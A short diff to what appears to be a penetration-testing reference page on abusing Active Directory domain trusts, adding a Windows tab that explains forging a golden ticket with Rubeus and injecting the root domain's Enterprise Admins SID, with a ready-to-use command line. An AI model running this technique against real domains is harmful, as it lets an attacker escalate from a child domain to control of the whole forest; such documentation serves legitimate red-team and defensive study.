@@ -49,7 +49,11 @@ raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD"
 
 <Tab value="Windows">
 
+From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) forges a golden ticket with the trusting domain's SID injected as an extra SID via `/sids:` (e.g. the root domain SID + `519` for Enterprise Admins).
 
+```powershell
+Rubeus.exe golden /rc4:$child_krbtgt_rc4 /domain:$child_domain_fqdn /sid:$child_domain_sid /sids:$root_domain_sid-519 /user:Administrator /ptt
+```
 
 </Tab>
 </Tabs>
